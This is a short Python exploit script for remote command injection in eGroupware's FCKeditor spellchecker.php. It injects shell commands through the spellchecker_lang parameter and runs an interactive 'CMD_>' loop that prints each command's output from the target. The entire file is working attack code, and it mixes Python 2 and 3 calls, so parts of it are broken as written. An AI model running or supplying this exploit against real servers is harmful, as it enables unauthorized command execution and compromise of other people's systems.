#!/usr/bin/python3

import requests
import sys
import threading
import urllib

def send_req(command):
        #Headers
        my_datas_headers ={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0",
            "Accept": "text/javascript, text/html, application/xml, text/xml, */*",
            "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "Content-type": "application/json; charset=UTF-8",
            "Connection": "close",
        }
        #If you want to edit and add headers some headers added
        s = requests.session()
       #if you want simple-> headers={'User-Agent': 'Mozilla', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive'}
        s.headers.update(my_datas_headers)
        params={"q":"||"+command+"||"}
        command_encoded = urllib.urlencode(params)
        command_encoded = command_encoded.split("=")[1]
        r = s.get(sys.argv[1]+"://"+sys.argv[2]+"/egroupware/phpgwapi/js/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/"+"spellchecker.php?spellchecker_lang=egroupware_spellchecker_cmd_exec.nasl"+command_encoded)
        return r.content
 
def main():
    if(len(sys.argv) < 3): 
        print("Usage:exploit.py <http/s> <IP> ")
        sys.exit(0)
    else:
        try:
            while True:
                cmd = raw_input("CMD_>")
                resp=send_req(cmd).split(";")[5].split("2>&1")[1]
                print(resp)

        except Exception:
            print(Exception)

main()
